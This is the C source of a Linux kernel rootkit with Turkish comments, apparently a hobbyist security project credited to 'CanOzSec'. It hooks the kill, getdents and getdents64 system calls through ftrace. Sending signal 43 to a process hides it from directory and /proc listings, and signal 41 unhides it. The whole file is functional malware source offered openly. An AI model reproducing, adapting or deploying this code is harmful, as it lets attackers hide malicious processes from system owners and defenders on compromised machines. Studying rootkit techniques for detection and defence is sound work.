#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include "ftrace-helper.h"

// Linux cekirdeginin istedigi bilgileri tanimla:
MODULE_LICENSE("GPL");
MODULE_AUTHOR("CanOzSec");
MODULE_DESCRIPTION("Islem gizleyici");
MODULE_VERSION("0.0.1");

// Orijinal kill, getdents, getdents64 cagrilarinin yapisini tanimla:
static asmlinkage long (*original_getdents64)(const struct pt_regs *);
static asmlinkage long (*original_getdents)(const struct pt_regs *);
static asmlinkage long (*original_kill)(const struct pt_regs *);

// Gizlenen islemin idsini saklayacak degisken tanimla:
char hidden_pid[NAME_MAX];


// sys_kill fonksiyonunun yerini alacak fonksiyonu tanimla: 
asmlinkage int hook_kill(const struct pt_regs *regs)
{
	// pt_regs yapisindan sistem cagrisi argumanlarini al:
	pid_t pid = regs->di; 
	int sig = regs->si;

	// Eger sinyal 43 ise kernel mesaji at ve islemi gizle:
	if (sig == 43)
	{
		printk(KERN_INFO "[CanOzSec-Rootkit]: %d islem idsine sahip islem gizleniyor...\n", pid);
		sprintf(hidden_pid, "%d", pid);
		return 0;
	}
	// Eger sinyal 41 ise kernel mesaji at ve islemi goster:
	if (sig == 41)
	{
		printk(KERN_INFO "[CanOzSec-Rootkit]: %d islem idsine sahip islem gosteriliyor...\n", pid);
		memset(&hidden_pid[0], 0x00, NAME_MAX);
	}

	// Eger sinyal 43 degilse orijinal kill cagrisini cagir:
	return original_kill(regs);
}


// sys_getdents64 fonksiyonunun yerini alacak fonksiyonu tanimla:
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
	// ISO C90 uyarisindan kurtulmak icin basta tanimladik:
	long error;
	// Orijinal fonksiyon cagrisinin sonuclarinin saklanacagi dirent yapisina bir pointer al:
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

	// Dosya listelemede looplarken kullanacagimiz yapilari tanimla:
	struct linux_dirent64 *current_dir, *dirent_kernel, *previous_dir = NULL;
	unsigned long offset = 0;

	// Orijinal cagriyi yapip sonuclari topluyoruz. kernelden bunun icin hafiza ayiriyoruz:
	int original_call_return_size = original_getdents64(regs);
	dirent_kernel = kzalloc(original_call_return_size, GFP_KERNEL);

	// Eger orijinal cagri hata dondururse veya birsey dondurmezse sonucu aynen dondur:
	if ( (original_call_return_size <= 0) || (dirent_kernel == NULL) )
		return original_call_return_size;

	// Kullanici kismindan kernel kismina orijinal dirent yapisini yeni hafiza ayirdigimiz yere kopyalatiyoruz:
	
	error = copy_from_user(dirent_kernel, dirent, original_call_return_size);
	if (error)
		goto done;

	// dirent dizisindeki her bir dirent yapisina teker teker bakiyoruz:  
	while (offset < original_call_return_size)
	{
		current_dir = (void *)dirent_kernel + offset;

		// Suanki dirent yapisinin d_name (isim) ozelligini hidden_pid (saklanacak islem idsi) ile kiyasla
		// Ayrica hidden_pid (saklanacak islem idsi) nin bos olmamasina dikkat yoksa her zaman dogru dondurur ve her dirent gizlenir.
		if ( (memcmp(hidden_pid, current_dir->d_name, strlen(hidden_pid)) == 0) && (strncmp(hidden_pid, "", NAME_MAX) != 0) )
		{
			// Eger hidden_pid listedeki ilk yapiysa listeyi 1 tane kaydirmak durumundayiz.
			if ( current_dir == dirent_kernel )
			{
				original_call_return_size -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, original_call_return_size);
				continue;
			}
			// Suanki klasorun uzunlugunu bir onceki klasorun uzunluguna ekle
			previous_dir->d_reclen += current_dir->d_reclen;
		}
		else
		{
			// Eger klasorun ismi hidden_pid degilse devam etmek icin suanki klasoru onceki klasore atariz:  
			previous_dir = current_dir;
		}

		// offsete suanki klasorun d_reclen ini ekle,
		// offset original_call_return_size'a esit oldugunda butun dosya listelemesine baktigimiz anlamina gelir.  
		offset += current_dir->d_reclen;
	}

	// Degistirilmis veya degistirilmemis dirent dizisini kernelden tekrar kullanici kismina kopyala: 
	error = copy_to_user(dirent, dirent_kernel, original_call_return_size);
	if (error)
		goto done;

done:
	// Temizlik fonksiyonu kullandigimiz hafiza alanini tekrar cekirdege dondur:
	kfree(dirent_kernel);
	return original_call_return_size;

}


// sys_getdents fonksiyonunun yerini alacak fonksiyonu tanimla:
asmlinkage int hook_getdents(const struct pt_regs *regs)
{
	// ISO C90 uyarisindan kurtulmak icin basta tanimladik:
	long error;
	// linux_dirent yapisi kernel.h dosyasindan cikarildigi icin biz tanimliyoruz:
	struct linux_dirent {
		unsigned long d_ino;
		unsigned long d_off;
		unsigned short d_reclen;
		char d_name[];
	};

	// Orijinal fonksiyon cagrisinin sonuclarinin saklanacagi dirent yapisina bir pointer al:
	struct linux_dirent *dirent = (struct linux_dirent *)regs->si;

	// Dosya listelemede looplarken kullanacagimiz yapilari tanimla:
	struct linux_dirent *current_dir, *dirent_kernel, *previous_dir = NULL;
	unsigned long offset = 0;

	// Orijinal cagriyi yapip sonuclari topluyoruz. kernelden bunun icin hafiza ayiriyoruz:
	int original_call_return_size = original_getdents(regs);
	dirent_kernel = kzalloc(original_call_return_size, GFP_KERNEL);

	// Eger orijinal cagri hata dondururse veya birsey dondurmezse sonucu aynen dondur:
	if ( (original_call_return_size <= 0) || (dirent_kernel == NULL) )
		return original_call_return_size;

	// Kullanici kismindan kernel kismina orijinal dirent yapisini yeni hafiza ayirdigimiz yere kopyalatiyoruz:
	error = copy_from_user(dirent_kernel, dirent, original_call_return_size);
	if (error)
		goto done;

	// dirent dizisindeki her bir dirent yapisina teker teker bakiyoruz:
	while (offset < original_call_return_size)
	{
		current_dir = (void *)dirent_kernel + offset;

		// Suanki dirent yapisinin d_name (isim) ozelligini hidden_pid (saklanacak islem idsi) ile kiyasla
		// Ayrica hidden_pid (saklanacak islem idsi) nin bos olmamasina dikkat yoksa her zaman dogru dondurur ve her dirent gizlenir.
		if ( (memcmp(hidden_pid, current_dir->d_name, strlen(hidden_pid)) == 0) && (strncmp(hidden_pid, "", NAME_MAX) != 0) )
		{
			// Eger hidden_pid listedeki ilk yapiysa listeyi 1 tane kaydirmak durumundayiz.
			if ( current_dir == dirent_kernel )
			{
				original_call_return_size -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, original_call_return_size);
				continue;
			}
			// Suanki klasorun uzunlugunu bir onceki klasorun uzunluguna ekle
			previous_dir->d_reclen += current_dir->d_reclen;
		}
		else
		{
			// Eger klasorun ismi hidden_pid degilse devam etmek icin suanki klasoru onceki klasore atariz: 
			previous_dir = current_dir;
		}

		// offsete suanki klasorun d_reclen ini ekle,
		// offset original_call_return_size'a esit oldugunda butun dosya listelemesine baktigimiz anlamina gelir.  
		offset += current_dir->d_reclen;
	}

	// Degistirilmis veya degistirilmemis dirent dizisini kernelden tekrar kullanici kismina kopyala: 
	error = copy_to_user(dirent, dirent_kernel, original_call_return_size);
	if (error)
		goto done;

done:
	// Temizlik fonksiyonu kullandigimiz hafiza alanini tekrar cekirdege dondur:
	kfree(dirent_kernel);
	return original_call_return_size;

}

// hooklanacak fonksiyonlari belirle
static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_getdents64", hook_getdents64, &original_getdents64),
	HOOK("__x64_sys_getdents", hook_getdents, &original_getdents),
	HOOK("__x64_sys_kill", hook_kill, &original_kill),
};

// baslangic fonksiyonunu tanimla:
static int __init rootkit_init(void)
{
	int err;
	err = hh_install_hooks(hooks, ARRAY_SIZE(hooks)); // hooklari kur
	if(err)
		return err;
	printk(KERN_INFO "[CanOzSec-Rootkit]: Process gizleyici cekirdege basariyla yuklendi!\n");
	return 0;
}


// bitis fonksiyonunu tanimla:
static void __exit rootkit_exit(void)
{
	hh_remove_hooks(hooks, ARRAY_SIZE(hooks)); // hooklari kaldir.
	printk(KERN_INFO "[CanOzSec-Rootkit]: Process gizleyici basariyla sonlandirildi.\n");
}


module_init(rootkit_init);
module_exit(rootkit_exit);
